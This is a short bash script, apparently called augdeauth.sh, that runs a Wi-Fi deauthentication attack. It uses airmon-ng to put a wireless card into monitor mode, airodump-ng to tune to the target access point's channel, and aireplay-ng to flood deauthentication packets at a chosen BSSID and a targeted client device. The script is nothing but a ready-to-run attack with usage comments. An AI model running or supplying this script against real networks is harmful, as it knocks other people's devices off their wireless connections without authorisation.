#./augdeauth.sh 90:3A:E6:22:71:A7 10 15 controller

#argument 1 is bssid 
#argument 2 is channel
#argument 3 # of packets#
#argument 4 # Mac Address of Targeted Controller

#Put wifi card in monitor mode 
airmon-ng start wlan0

#airodump to put it on the right channel
timeout --foreground 3 airodump-ng -c "$2" -w out --bssid "$1" wlan0mon  & sleep 3
echo "scan done"

# Command to deauth a 
aireplay-ng --ignore-negative-one -0 "$3" -a "$1" -c "$4" wlan0mon
